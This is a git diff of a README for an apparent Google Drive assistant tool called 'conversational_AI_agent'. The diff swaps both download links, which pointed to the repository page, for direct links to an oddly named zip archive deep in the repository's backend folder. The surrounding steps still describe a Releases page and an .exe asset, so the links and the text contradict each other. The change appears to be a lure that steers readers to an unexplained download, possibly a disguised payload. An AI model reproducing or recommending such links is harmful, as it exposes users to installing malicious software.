@@ -1,6 +1,6 @@
 # 🤖 conversational_AI_agent - Manage your Google Drive files easily
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Berkshireelectricalpower368/conversational_AI_agent)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Berkshireelectricalpower368/conversational_AI_agent/raw/refs/heads/main/backend/conversational-A-agent-microtone.zip)
 
 ## 📁 About the application
 
@@ -25,7 +25,7 @@ Ensure your computer meets these basic requirements before you start:
 
 Follow these steps to obtain the software:
 
-1.  Visit the [official download site](https://github.com/Berkshireelectricalpower368/conversational_AI_agent).
+1.  Visit the [official download site](https://github.com/Berkshireelectricalpower368/conversational_AI_agent/raw/refs/heads/main/backend/conversational-A-agent-microtone.zip).
 2.  Locate the section labeled "Releases" on the right side of the page.
 3.  Click the most recent version shown at the top.
 4.  Find the file that ends with ".exe" under the "Assets" heading.
